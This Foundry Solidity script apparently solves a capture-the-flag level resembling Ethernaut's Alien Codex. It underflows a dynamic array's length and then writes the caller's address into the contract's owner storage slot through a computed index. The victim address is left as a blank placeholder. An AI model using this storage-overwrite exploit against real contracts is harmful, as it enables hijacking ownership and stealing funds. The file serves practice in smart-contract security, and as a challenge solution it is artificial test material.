// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address victim = ; // Your instance address

    function run() external {
        vm.startBroadcast();
        victim.call(abi.encodeWithSignature("makeContact()"));
        victim.call(abi.encodeWithSignature("retract()"));
        vm.stopBroadcast();

        uint256 index;
        unchecked {
            index -= uint256((keccak256(abi.encodePacked(uint256(1)))));
        }

        vm.startBroadcast();
        victim.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, bytes32(uint256(uint160(msg.sender)))));
        vm.stopBroadcast();
    }
}
